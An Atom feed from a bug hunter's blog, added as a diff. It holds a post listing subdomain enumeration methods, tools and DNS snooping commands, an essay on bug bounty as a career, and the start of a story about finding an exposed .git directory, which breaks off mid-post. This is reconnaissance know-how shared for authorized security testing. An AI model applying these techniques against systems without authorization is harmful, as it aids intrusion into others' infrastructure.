@@ -1,0 +1,2451 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+<title type="text">Gwendal Le Coguic</title>
+<generator uri="https://github.com/mojombo/jekyll">Jekyll</generator>
+<link rel="self" type="application/atom+xml" href="http://10degres.net/feed.xml" />
+<link rel="alternate" type="text/html" href="http://10degres.net" />
+<updated>2018-05-03T15:17:11+01:00</updated>
+<id>http://10degres.net/</id>
+<author>
+  <name>Gwen</name>
+  <uri>http://10degres.net/</uri>
+  <email>g@10degres.net</email>
+</author>
+
+
+<entry>
+  <title type="html"><![CDATA[Subdomain enumeration]]></title>
+ <link rel="alternate" type="text/html" href="http://10degres.net/subdomain-enumeration/" />
+  <id>http://10degres.net/subdomain-enumeration</id>
+  <published>2018-04-21T00:00:00+01:00</published>
+  <updated>2018-04-21T00:00:00+01:00</updated>
+  <author>
+    <name>Gwen</name>
+    <uri>http://10degres.net</uri>
+    <email>g@10degres.net</email>
+  </author>
+  <content type="html">
+    &lt;p&gt;A friend recently asked me what methods I use to find subdomains.
+To be honest I was confused, like &lt;em&gt;“oooohhh so much, brute force mmm… zone transfer and… brute for… wait Google and mmm… many other tools!”&lt;/em&gt;
+What a shame that I was so inaccurate after so much time spent to look for subdomains.
+Time to dig a little bit!
+After I wrote a list of the most popular methods, I tried to make a list of some tools and online resources to exploit them.
+Of course this list is far from exhaustive, there are many new stuff every day, but it’s still a good start :)
+&lt;!--more--&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;methods&quot;&gt;Methods&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;Brute force&lt;/strong&gt;&lt;br /&gt;
+The easiest way. Try millions and millions words as subdomains and check which ones are alive with a forward DNS request.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Zone transfer aka AXFR&lt;/strong&gt;&lt;br /&gt;
+Zone transfer is a mechanism that administrators can use to replicate DNS databases but sometimes the DNS is not well configured and this operation is allowed by anyone, revealing all subdomains configured.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;DNS cache snooping&lt;/strong&gt;&lt;br /&gt;
+DNS cache snooping is a specific way to query a DNS server in order to check if a record exists in his cache.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Reverse DNS&lt;/strong&gt;&lt;br /&gt;
+Try to find the domain name associated with an IP address, it’s the opposite of Forward DNS.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Alternative names&lt;/strong&gt;&lt;br /&gt;
+Once the first round of your recon is finished, apply permutations and transformations (based on another wordlist maybe?) to all subdomains discovered in order to find new ones.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Online DNS tools&lt;/strong&gt;&lt;br /&gt;
+There are many websites that allow to query DNS databases and their history.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;SSL Certificates&lt;/strong&gt;&lt;br /&gt;
+Request informations about all certificates linked to a specific domain, and obtain a list of subdomains covered by these certificates.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Search engines&lt;/strong&gt;&lt;br /&gt;
+Search for a specific domain in your favourite search engine then minus the discovered sudomains one by one &lt;code class=&quot;highlighter-rouge&quot;&gt;site:example.com -www -dev&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Technical tools/search engines&lt;/strong&gt;&lt;br /&gt;
+More and more companies host their code online on public platform, most of the time these services have a search bar.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Text parsing&lt;/strong&gt;&lt;br /&gt;
+Parse the HTML code of a website to find new subdomains, this can be applied to every resources of the company, office documents as well.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;VHost discovery&lt;/strong&gt;&lt;br /&gt;
+Try to find any other subdomain configured on the same web server by brute forcing the HTTP &lt;code class=&quot;highlighter-rouge&quot;&gt;Host&lt;/code&gt; header.&lt;/p&gt;
+
+&lt;h2 id=&quot;tools&quot;&gt;Tools&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/infosec-au/altdns&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;Altdns&lt;/a&gt;: alternative names brute forcing&lt;br /&gt;
+&lt;a href=&quot;https://github.com/caffix/amass&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;Amass&lt;/a&gt;: brute force, Google, VirusTotal, alt names&lt;br /&gt;
+&lt;a href=&quot;https://github.com/michenriksen/aquatone&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;aquatone-discover&lt;/a&gt;: Brute force, Riddler, PassiveTotal, Threat Crowd, Google, VirusTotal, Shodan, SSL Certificates, Netcraft, HackerTarget, DNSDB&lt;br /&gt;
+&lt;a href=&quot;https://github.com/sensepost/BiLE-suite&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;BiLE-suite&lt;/a&gt;: HTML parsing, alt names, reverse DNS&lt;br /&gt;
+&lt;a href=&quot;https://github.com/tomsteele/blacksheepwall&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;blacksheepwall&lt;/a&gt;: AXFR, brute force, reverse DNS, Censys, Yandex, Bing, Shodan, Logontube, SSL Certificates, Virus Total&lt;br /&gt;
+&lt;a href=&quot;https://github.com/RandomStorm/Bluto&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;Bluto&lt;/a&gt;: AXFR, netcraft, brute force&lt;br /&gt;
+&lt;a href=&quot;https://github.com/anshumanbh/brutesubs&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;brutesubs&lt;/a&gt;: enumall, Sublist3r, Altdns&lt;br /&gt;
+&lt;a href=&quot;https://github.com/mandatoryprogrammer/cloudflare_enum&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;cloudflare_enum&lt;/a&gt;: Cloudflare DNS&lt;br /&gt;
+&lt;a href=&quot;https://github.com/UnaPibaGeek/ctfr&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;CTFR&lt;/a&gt;: SSL Certificates&lt;br /&gt;
+&lt;a href=&quot;https://github.com/m0nad/DNS-Discovery&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;DNS-Discovery&lt;/a&gt;: brute force&lt;br /&gt;
+&lt;a href=&quot;https://github.com/lorenzog/dns-parallel-prober&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;DNS Parallel Prober&lt;/a&gt;: DNS resolver&lt;br /&gt;
+&lt;a href=&quot;https://github.com/rbsec/dnscan&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;dnscan&lt;/a&gt;: AXFR, brute force&lt;br /&gt;
+&lt;a href=&quot;https://github.com/darkoperator/dnsrecon&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;dnsrecon&lt;/a&gt;: AXFR, brute force, reverse DNS, snoop caching, Google&lt;br /&gt;
+&lt;a href=&quot;https://github.com/evilsocket/dnssearch&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;dnssearch&lt;/a&gt;: brute force&lt;br /&gt;
+&lt;a href=&quot;https://github.com/reconned/domained&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;domained&lt;/a&gt;: Sublist3r, enumall, Knockpy, SubBrute, MassDNS, recon-ng&lt;br /&gt;
+&lt;a href=&quot;https://github.com/jhaddix/domain&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;enumall&lt;/a&gt;: recon-ng -&amp;gt; Google, Bing, Baidu, Netcraft, brute force&lt;br /&gt;
+&lt;a href=&quot;https://github.com/mschwager/fierce&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;Fierce&lt;/a&gt;: AXFR, brute force, reverse DNS&lt;br /&gt;
+&lt;a href=&quot;http://github.com/guelfoweb/knock&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;Knockpy&lt;/a&gt;: AXFR, virustotal, brute force&lt;br /&gt;
+&lt;a href=&quot;https://github.com/blechschmidt/massdns&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;MassDNS&lt;/a&gt;: DNS resolver&lt;br /&gt;
+&lt;a href=&quot;https://github.com/mhmdiaa/second-order&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;Second Order&lt;/a&gt;: HTML parsing&lt;br /&gt;
+&lt;a href=&quot;https://github.com/jrozner/sonar&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;Sonar&lt;/a&gt;: AXFR, brute force&lt;br /&gt;
+&lt;a href=&quot;https://github.com/TheRook/subbrute&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;SubBrute&lt;/a&gt;: brute force&lt;br /&gt;
+&lt;a href=&quot;https://github.com/aboul3la/Sublist3r&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;Sublist3r&lt;/a&gt;: Baidu, Yahoo, Google, Bing, Ask, Netcraft, DNSdumpster, VirusTotal, Threat Crowd, SSL Certificates, PassiveDNS&lt;br /&gt;
+&lt;a href=&quot;https://github.com/laramies/theHarvester&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;theHarvester&lt;/a&gt;: reverse DNS, brute force, Google, Bing, Dogpile, Yahoo, Baidu, Shodan, Exalead&lt;br /&gt;
+TXDNS: alt names (typo/tld)&lt;br /&gt;
+&lt;a href=&quot;https://github.com/gwen001/vhost-brute&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;vhost-brute&lt;/a&gt;: vhost discovery&lt;br /&gt;
+&lt;a href=&quot;https://github.com/codingo/VHostScan&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;VHostScan&lt;/a&gt;: vhost discovery&lt;br /&gt;
+&lt;a href=&quot;https://github.com/jobertabma/virtual-host-discovery&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;virtual-host-discovery&lt;/a&gt;: vhost discovery&lt;/p&gt;
+
+&lt;h2 id=&quot;online-dns-tools&quot;&gt;Online DNS tools&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://hackertarget.com/&quot; target=&quot;_blank&quot;&gt;https://hackertarget.com/&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;http://searchdns.netcraft.com/&quot; target=&quot;_blank&quot;&gt;http://searchdns.netcraft.com/&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://dnsdumpster.com/&quot; target=&quot;_blank&quot;&gt;https://dnsdumpster.com/&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://www.threatcrowd.org/&quot; target=&quot;_blank&quot;&gt;https://www.threatcrowd.org/&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://riddler.io/&quot; target=&quot;_blank&quot;&gt;https://riddler.io/&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://api.passivetotal.org&quot; target=&quot;_blank&quot;&gt;https://api.passivetotal.org&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://www.censys.io&quot; target=&quot;_blank&quot;&gt;https://www.censys.io&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://api.shodan.io&quot; target=&quot;_blank&quot;&gt;https://api.shodan.io&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;http://www.dnsdb.org/f/&quot; target=&quot;_blank&quot;&gt;http://www.dnsdb.org/f/&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://www.dnsdb.info/&quot; target=&quot;_blank&quot;&gt;https://www.dnsdb.info/&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://scans.io/&quot; target=&quot;_blank&quot;&gt;https://scans.io/&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://findsubdomains.com/&quot; target=&quot;_blank&quot;&gt;https://findsubdomains.com/&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://securitytrails.com/dns-trails&quot; target=&quot;_blank&quot;&gt;https://securitytrails.com/dns-trails&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://crt.sh/&quot; target=&quot;_blank&quot;&gt;https://crt.sh/&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://certspotter.com/api/v0/certs?domain=example.com&quot; target=&quot;_blank&quot;&gt;https://certspotter.com/api/v0/certs?domain=example.com&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://transparencyreport.google.com/https/certificates&quot; target=&quot;_blank&quot;&gt;https://transparencyreport.google.com/https/certificates&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://developers.facebook.com/tools/ct&quot; target=&quot;_blank&quot;&gt;https://developers.facebook.com/tools/ct&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;search-engines&quot;&gt;Search engines&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://www.baidu.com/&quot; target=&quot;_blank&quot;&gt;http://www.baidu.com/&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;http://www.yahoo.com/&quot; target=&quot;_blank&quot;&gt;http://www.yahoo.com/&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;http://www.google.com/&quot; target=&quot;_blank&quot;&gt;http://www.google.com/&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;http://www.bing.com/&quot; target=&quot;_blank&quot;&gt;http://www.bing.com/&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://www.yandex.ru/&quot; target=&quot;_blank&quot;&gt;https://www.yandex.ru/&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://www.exalead.com/search/&quot; target=&quot;_blank&quot;&gt;https://www.exalead.com/search/&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;http://www.dogpile.com/&quot; target=&quot;_blank&quot;&gt;http://www.dogpile.com/&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://www.zoomeye.org/&quot; target=&quot;_blank&quot;&gt;https://www.zoomeye.org/&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://fofa.so/&quot; target=&quot;_blank&quot;&gt;https://fofa.so/&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;technical-toolssearch-engines&quot;&gt;Technical tools/search engines&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/&quot; target=&quot;_blank&quot;&gt;https://github.com/&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://gitlab.com/&quot; target=&quot;_blank&quot;&gt;https://gitlab.com/&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://www.virustotal.com/fr/&quot; target=&quot;_blank&quot;&gt;https://www.virustotal.com/fr/&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;dns-cache-snooping&quot;&gt;DNS cache snooping&lt;/h2&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nslookup -norecursive domain.com
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sU -p 53 --script dns-cache-snoop.nse --script-args 'dns-cache-snoop.mode=timed,dns-cache-snoop.domains={domain1,domain2,domain3}' &amp;lt;ip&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;others-online-resources&quot;&gt;Others online resources&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://ask.fm/&quot; target=&quot;_blank&quot;&gt;https://ask.fm/&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;http://logontube.com/&quot; target=&quot;_blank&quot;&gt;http://logontube.com/&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;http://commoncrawl.org/&quot; target=&quot;_blank&quot;&gt;http://commoncrawl.org/&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;http://www.sitedossier.com/&quot; target=&quot;_blank&quot;&gt;http://www.sitedossier.com/&lt;/a&gt;&lt;/p&gt;
+
+
+    &lt;p&gt;&lt;a href=&quot;http://10degres.net/subdomain-enumeration/&quot;&gt;Subdomain enumeration&lt;/a&gt; was originally published by Gwen at &lt;a href=&quot;http://10degres.net&quot;&gt;Gwendal Le Coguic&lt;/a&gt; on April 21, 2018.&lt;/p&gt;
+  </content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Why Bug Bounty]]></title>
+ <link rel="alternate" type="text/html" href="http://10degres.net/why-bugbounty/" />
+  <id>http://10degres.net/why-bugbounty</id>
+  <published>2018-03-29T00:00:00+01:00</published>
+  <updated>2018-03-29T00:00:00+01:00</updated>
+  <author>
+    <name>Gwen</name>
+    <uri>http://10degres.net</uri>
+    <email>g@10degres.net</email>
+  </author>
+  <content type="html">
+    &lt;p&gt;People are usually surprised by the answer when they ask me what I do for living, questions rain, here are some answers. 
+My first report was a XSS on a Yahoo acquisition, it happened the 26th January 2016. Since this date, I (try to) perform Bug Bounty as a full time job on &lt;a href=&quot;https://hackerone.com&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;Hackerone&lt;/a&gt;. 
+Did I say “job”? I don’t really consider bug bounty/hacking as a “job”, it’s more a hobby or a passion, because you have to be passionnate to perform in this domain. 
+So let’s say that bug bounty is my main source of income. 
+Below why I do this “job”, why it fits perfectly to me and why I love it.&lt;br /&gt;
+&lt;!--more--&gt;
+&lt;br /&gt;
+&lt;a href=&quot;/images/bb-mybblife.png&quot;&gt;&lt;img src=&quot;/images/bb-mybblife.png&quot; alt=&quot;My Bug Bounty life&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;-whoami&quot;&gt;# whoami&lt;/h2&gt;
+
+&lt;p&gt;First of all: life is unfair. Depending where you are born, everything is different.
+So to understand my point of view, you need to know a little bit about me.&lt;/p&gt;
+
+&lt;p&gt;I am 40+ years old, I am French, I had always lived/worked in Paris and the close suburb.
+I started web development at the end of 1999. It was the very beginning of the Internet in my country.
+At that time we had “Webmasters”, you know, that person that could do everything, well she had to do everything because she was the only one to understand all of this shit: code, hosting services, integration, database, design and sometimes customer relationships.
+1 person where we now have 10.
+A friend told me about PHP3, it sounded pretty easy compared to another compiled language, &lt;em&gt;“If you are comfortable with C, you will be easy with PHP”&lt;/em&gt;, true. 
+&lt;em&gt;“You don’t need to declare the variables nor initialize anything, you don’t even have to care about the errors”&lt;/em&gt;, so cool!&lt;/p&gt;
+
+&lt;p&gt;18 years later, I’m definitely not a PHP guru nor an Internet master. I had mainly coded basic websites, internal admin panels and small testing tools since I started security, in 2015, after I was fired for security reasons (understand: for having reported several SQLi in the main website of my company).
+Like many web developers, I didn’t know anything about security, I started from zero. 
+3 hard months to get &lt;a href=&quot;https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/&quot;&gt;OSCP&lt;/a&gt;. 
+At the same time I heard about bug bounty, I jumped into it at the beginning of 2016.&lt;/p&gt;
+
+&lt;h2 id=&quot;-money&quot;&gt;$ money&lt;/h2&gt;
+
+&lt;p&gt;Hey what did you expect?&lt;/p&gt;
+
+&lt;p&gt;In what kind of (legal) job I could earn 10k$ in 2 days? Seriously??
+Even in my wildest dreams, I would have never imagine that. Ok it’s not everyday, but… I don’t really need to earn that much every single day.
+Some people ask me if I’m not afraid because of that, because “the salary” is not stable.
+Yeah it’s true, it’s not reliable. But the thing I love is that it mainly depends on me.&lt;/p&gt;
+
+&lt;p&gt;In a company, who decides my salary?
+In a company, whatever my knowledge, my skills, no matter the time I spend at the office, if I don’t have good feelings with my supervisor, I’m screwed.
+If (s)he hates me, (s)he will only relate bullshits about me to his/her own boss or (s)he will get credit for my work. 
+My salary is mainly linked to this person.
+That’s it.
+When I finally get something, I only get a very little something, close to nothing compared of what I asked, what I really deserve for my devotion, for those hours spent on my weekends to repair the errors done by others.&lt;/p&gt;
+
+&lt;p&gt;In bug bounty, it’s very different.
+The money mainly depends on my knowledge because the rewards depend on the severity of the vulnerabilities I report.
+Ok the companies decide the bounties, true again, but if I don’t like the bounties offered by a company, I can simply move to another one.
+There are many many programs and some companies offer big payments like Facebook, Google, Yahoo, Uber and many others. 
+They are public programs, they offer great bounties and no, they are not bulletproof, there are a lot of holes everywhere, it’s up to me to find them.
+Month after month my knowledge increases, so the more I practice, the more chance I get to find big issues and grab big bounties. 
+However, I always keep in my mind that bug bounty is like every other freelance job, no work = no money.&lt;/p&gt;
+
+&lt;h2 id=&quot;-learning&quot;&gt;+ learning&lt;/h2&gt;
+
+&lt;p&gt;A company usually hires me for my skills, my &lt;u&gt;current&lt;/u&gt; skills, not the skills I’ll potentially have (or not) in the future.
+They have some tasks in the pool and they need someone to flush the queue, they need me right here right now to do this stuff. 
+My potential, my ability to learn, what I will be able to do in 5 years, they can’t bet on this because they don’t know me and most of the time they simply don’t care about that.
+Because of that I can only apply to jobs I am qualified for, I already know, I have already done before.
+Some nice companies could help me to evolve, to move from a chair to another, they can offer me a course where I’ll get new knowledge, hopefully.
+But it’s still pretty rare, too rare in France in my opinion, it has never happened to me, I have always paid the courses by myself.&lt;/p&gt;
+
+&lt;p&gt;In bug bounty each case is different.
+I meet so many different types of architecture and crazy combinations of different technologies.
+I have to take care of older vulnerabilites (sometimes very very old stuff) but I also have to stay up to date because new bugs appear every day.
+I read thousands of articles, I watch videos, I buy books, I follow other hackers, I test the things by myself which makes me better and better.
+My skills grow very fast. 
+I learn something new every day and it’s fucking exciting!&lt;/p&gt;
+
+&lt;h2 id=&quot;-gratefulness&quot;&gt;&amp;amp; gratefulness&lt;/h2&gt;
+
+&lt;p&gt;In my country, people like me (like you?), geeks, we are just stupid kids that play video games all day. 
+We are not well considered by companies, we are like tissue, use it, throw it away.
+&lt;em&gt;“You’re not happy here? Go away, there are thousands of people like you waiting for your seat.”&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;In bug bounty, I have been amazed by how the companies can be nice.
+I received much more congratulations in the first 3 months of my hunter career than the past 18 years. Isn’t that crazy? 
+The rewards themselves can be considered as a thanks but it’s definitely not the most important for me, I appreciate the words much more.&lt;br /&gt;
+&lt;em&gt;“Damn man you did a great job, that was awesome, we are happy to give you 300$ for that.”&lt;/em&gt;&lt;br /&gt;
+Bug bounty? Daily. Company? Legend.&lt;br /&gt;
+&lt;a href=&quot;/images/bb-thanks.png&quot;&gt;&lt;img src=&quot;/images/bb-thanks.png&quot; alt=&quot;Bug Bounty thanks&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;o-statisfaction&quot;&gt;\o/ statisfaction&lt;/h2&gt;
+
+&lt;p&gt;Trust me, there is nothing more exciting than popping a shell on a remote server, not even sex, really.
+No matter the bounty. 
+I can dance like an idiot watching the result of the commands.
+And when the issue is fixed, I have this feeling that I did something good.
+I’m so happy to see that all these hours/days/weeks/months spent to learn hacking are finally rewarded.
+All this time working so fucking hard, all these failures, and finally get it.
+Days after the report is closed I still read it again and again, proud of myself :)&lt;/p&gt;
+
+&lt;p&gt;Or being able to bypass a SSRF filter, it’s like successfully solving the biggest challenge of my life.
+It reminds me of the first time I finished this one, same feeling, every time.&lt;br /&gt;
+&lt;a href=&quot;/images/bb-rubiks-cube.png&quot;&gt;&lt;img src=&quot;/images/bb-rubiks-cube.png&quot; alt=&quot;Bug Bounty Rubik's Cube&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;-contact&quot;&gt;&amp;gt; contact&lt;/h2&gt;
+
+&lt;p&gt;Since I perform bug bounty, I joined Twitter, I have been to several conventions, where I met many people in the security industry like Sam Houston in London.
+I have been in touch with people from big companies like Yahoo or Uber.
+I share techniques with some of the more talented hunters on this planet, I spent some days with Geekboy in India, Nicolas Grégoire in Paris, Jobert Abma and Pete Yaworski in Québec, and many others…
+This is definitely something that would never have happened if I would have stayed stuck in my small office (or big open space) in a company because I mainly had contact with my close colleagues, sometimes the office next to us but come on…&lt;/p&gt;
+
+&lt;p&gt;Plus, since I only need a computer and a Wi-Fi connection to “work”, I can do that from anywhere in the world. Any country, any hotel or any coffee shop… 
+I can travel to meet my fellow hunters and make money at the same time or I can visit the company I hack.
+You know, meet those people you talk with but you never see, that’s so cool to meet them in real life.
+I have never met so many interesting people that could teach me such interesting things.&lt;/p&gt;
+
+&lt;h2 id=&quot;-whats-next&quot;&gt;? what’s next&lt;/h2&gt;
+
+&lt;p&gt;I consider bug bounty as a step in my life, I don’t plan to do it for ever.
+For now it’s the best way for me to learn &amp;amp; earn at the same time.
+My goal is to perform pentest and whatever the platform, being able to enter the system of the company I’m dealing with, no matter if it has webapps or not.
+However since I have been a web developper for ages, web testing is obviously my entry point in the security world.&lt;/p&gt;
+
+&lt;p&gt;I think the next step will be network and system testing but for that, even if I already have the basics, I still have many many things to learn.
+I had some small experiences with CTF in the conventions I have been to, it was so fun and I learn so much there that I will probably give a try that way, it’s also a good way to meet people.&lt;/p&gt;
+
+&lt;h2 id=&quot;-conclusion&quot;&gt;| conclusion&lt;/h2&gt;
+
+&lt;p&gt;Money, knowledge, thanks, people, personal satisfaction, all these things make bug bounty the best “job” ever for me.
+The best way to make your own opinion is to give it a try, also take care to read the stories linked at the very bottom of this page.&lt;/p&gt;
+
+&lt;p&gt;Now I want to say something to developers, especially French people.
+If you work in a company, if you are not happy in your daily job, if you don’t like the way they use you, if you think you deserve something better.
+You have to know that you can choose. Really!
+There are several options.
+Freelancing is one of them.
+It can be scary at first but remember that you have the strongest position.
+You have &lt;u&gt;skills&lt;/u&gt;, you have &lt;u&gt;experience&lt;/u&gt;, you have &lt;u&gt;potential&lt;/u&gt;, you have a &lt;u&gt;real value&lt;/u&gt; (and I’m not only talking about money), never doubt that and don’t let anyone tell you the opposite.
+Companies need you much more than you need them because you create the world of today and tomorrow.&lt;/p&gt;
+
+&lt;p&gt;Do you know this story? A company hires a senior designer to create a new logo for the brand.
+2 days later the freelancer comes back with some graphics.
+The artistic director of the company studies the propositions and chooses one.
+Then he asks the invoice to the designer, what a surprise when he discovers the total amount:&lt;br /&gt;
+&lt;em&gt;- 5000$ ?!! Seriously ? 5000$ for 2 days of work ??? For a single image ??&lt;/em&gt;&lt;br /&gt;
+Reply:&lt;br /&gt;
+&lt;em&gt;- No, 5000$ for 15 years of work.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;My opinion.&lt;/p&gt;
+
+    &lt;p&gt;&lt;a href=&quot;http://10degres.net/why-bugbounty/&quot;&gt;Why Bug Bounty&lt;/a&gt; was originally published by Gwen at &lt;a href=&quot;http://10degres.net&quot;&gt;Gwendal Le Coguic&lt;/a&gt; on March 29, 2018.&lt;/p&gt;
+  </content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[The bug bounty program that changed my life]]></title>
+ <link rel="alternate" type="text/html" href="http://10degres.net/the-bugbounty-program-that-changed-my-life/" />
+  <id>http://10degres.net/the-bugbounty-program-that-changed-my-life</id>
+  <published>2018-02-11T00:00:00+00:00</published>
+  <updated>2018-02-11T00:00:00+00:00</updated>
+  <author>
+    <name>Gwen</name>
+    <uri>http://10degres.net</uri>
+    <email>g@10degres.net</email>
+  </author>
+  <content type="html">
+    &lt;p&gt;This is a real story or not, that occured in mid 2017 or not, about a private program or not, on Hackerone or not, believe me or not, but it changed my life.
+I would like to thanks all the people from this company I talked with.
+They were very nice with me, very fast to fix the bugs and I always got the rewards in less than 7 days, frequently the day of the report, even for the smallest bugs.
+Thanks to them, I wish we could find more program like this one.
+&lt;!--more--&gt;&lt;/p&gt;
+
+&lt;p&gt;The money was not the only good thing I earned during this period, my reputation on Hackerone also grew up very fast.
+From here I received many private invitations, sometimes 3 or 4, up to 5 a week, and we all know that private programs are very important for hunters.
+I also learned alot because it was the very first time that I was able to play with such issues, I mean in real life, not on a training platform, so it was really really formative.&lt;/p&gt;
+
+&lt;p&gt;Some people were mad on me because I didn’t want to share my findings in this program.
+Come on guys…
+Following each others on Twitter doesn’t mean I want/can disclose the details of the issues I found in a private program, specially if you’re also working on…&lt;br /&gt;
+It would be like cutting the branch of the tree I’m sitting on.
+I hope you understand that.&lt;br /&gt;
+Kisses :)&lt;/p&gt;
+
+&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
+
+&lt;p&gt;Had a hard a time to contact the company, the kool &lt;a href=&quot;https://twitter.com/emgeekboy&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;@Geekboy&lt;/a&gt; helped me to enter in the game, thanks to him.&lt;/p&gt;
+
+&lt;p&gt;So I joined with 1 subdomain takeover on Cloudfront and 2 SQL injection on a minor subdomain, not bad at all, promising.&lt;/p&gt;
+
+&lt;h2 id=&quot;first-hit-well-official-hit&quot;&gt;First hit, well, “official” hit…&lt;/h2&gt;
+
+&lt;p&gt;A big scan with Dirb on another subdomain revealed a &lt;code class=&quot;highlighter-rouge&quot;&gt;.git&lt;/code&gt; directory.
+Using the program &lt;a href=&quot;https://github.com/koto/gitpillage&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;gitpillage&lt;/a&gt;, I got some interesting files:&lt;br /&gt;
+&lt;a href=&quot;/images/pp-git-listing.png&quot;&gt;&lt;img src=&quot;/images/pp-git-listing.png&quot; alt=&quot;Private program git listing&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;That could be enough to write a report but since it was PHP code and since I can read PHP, I jumped in the source (PHP guru will recognize the very old Zend Studio 5.5 here xD).
